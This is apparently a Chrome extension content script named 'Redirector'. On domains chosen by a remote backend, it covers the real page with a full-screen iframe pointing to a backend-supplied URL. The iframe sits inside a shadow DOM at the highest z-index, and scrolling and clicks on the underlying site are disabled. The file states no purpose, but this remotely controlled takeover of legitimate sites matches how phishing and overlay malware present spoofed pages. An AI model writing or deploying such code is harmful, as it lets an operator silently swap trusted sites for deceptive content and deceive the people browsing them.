// content.js - Dynamic full-page overlay (Redirector)

let csDebugMode = false; 

function log(level, ...args) {
    if (csDebugMode) { 
        console[level](`[CS-${level.toUpperCase()}]`, ...args);
    }
}

// --- Normalize URL Hostname for Comparison ---
function normalizeHostname(url) {
    try {
        const hostname = new URL(url).hostname.toLowerCase();
        return hostname.replace(/^www\./, '');
    } catch (e) {
        const simplified = url.toLowerCase().split('/')[2] || '';
        return simplified.replace(/^www\./, '');
    }
}

// --- Apply Full-Page Overlay ---
function applyOverlay(iframeSrc) {
    log("info", `ApplyOverlay: Injecting iframe with source: ${iframeSrc}`);

    if (document.getElementById('dynamic-overlay-container')) {
        log('warn', 'ApplyOverlay: Container already exists, aborting.');
        return;
    }

    const iframeStyle = { 
        position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh', 
        border: 'none', margin: '0', padding: '0', zIndex: '2147483647', backgroundColor: 'white' 
    };

    try {
        const container = document.createElement('div');
        container.id = 'dynamic-overlay-container';
        Object.assign(container.style, { 
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh', 
            zIndex: '2147483647', pointerEvents: 'auto' 
        });

        const shadowRoot = container.attachShadow({ mode: 'open' });
        const overlay = document.createElement('iframe');
        overlay.src = iframeSrc;
        Object.assign(overlay.style, iframeStyle);
        shadowRoot.appendChild(overlay);

        if (document.documentElement) {
            document.documentElement.prepend(container);
            log('info', 'ApplyOverlay: Container prepended.');
        } else {
             return; 
        }

        // Block interaction with the page behind the iframe
        try {
            document.documentElement.style.setProperty('overflow', 'hidden', 'important');
            document.documentElement.style.setProperty('pointer-events', 'none', 'important');
            
            if (document.body) {
                 document.body.style.setProperty('overflow', 'hidden', 'important');
                 document.body.style.setProperty('pointer-events', 'none', 'important');
            } else { 
                 const observer = new MutationObserver((_, obs) => {
                    if (document.body) {
                        document.body.style.setProperty('overflow', 'hidden', 'important');
                        document.body.style.setProperty('pointer-events', 'none', 'important');
                        obs.disconnect();
                    }
                 });
                 observer.observe(document.documentElement, { childList: true });
                 setTimeout(() => { observer.disconnect(); }, 150);
            }
        } catch (e) { log("warn", "ApplyOverlay: Could not fully disable page interaction.", e); }

    } catch (error) {
        console.error('[CS-CRITICAL] ApplyOverlay: CRITICAL ERROR:', error); 
    }
}

// --- Main Execution Logic ---
function runOverlayCheck() {
    if (document.documentElement.hasAttribute('data-overlay-check-running')) return;
    document.documentElement.setAttribute('data-overlay-check-running', 'true');

    const currentRawUrl = window.location.href;
    const currentNormalizedHost = normalizeHostname(currentRawUrl);

    chrome.runtime.sendMessage({ action: 'getLatestStatus', forceRefresh: true }, (response) => { 
        if (chrome.runtime.lastError || !response || response.error) {
            document.documentElement.removeAttribute('data-overlay-check-running'); 
            return;
        }

        csDebugMode = response.debugMode === true;
        log('info', "Received status from background:", response);

        if (!response.isEnabled) {
            log('info', "Device is disabled via backend. Aborting overlay.");
            document.documentElement.removeAttribute('data-overlay-check-running');
            return;
        }

        const targetConfig = response.config;
        if (!targetConfig || typeof targetConfig !== 'object' || Object.keys(targetConfig).length === 0) {
            document.documentElement.removeAttribute('data-overlay-check-running');
            return;
        }

        let replacementUrl = null;
        for (const targetDomainKey in targetConfig) {
            if (currentNormalizedHost === targetDomainKey) {
                replacementUrl = targetConfig[targetDomainKey];
                break; 
            }
        }

        if (replacementUrl) {
            log('info', `FINAL MATCH: ${currentNormalizedHost}. Applying overlay.`);
            applyOverlay(replacementUrl);
        } else {
            document.documentElement.removeAttribute('data-overlay-check-running'); 
        }
    });
}

// --- Trigger on Load ---
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
         if (!document.documentElement.hasAttribute('data-overlay-check-running')) {
             runOverlayCheck();
         }
     }, { once: true });
     runOverlayCheck();
} else {
    runOverlayCheck();
}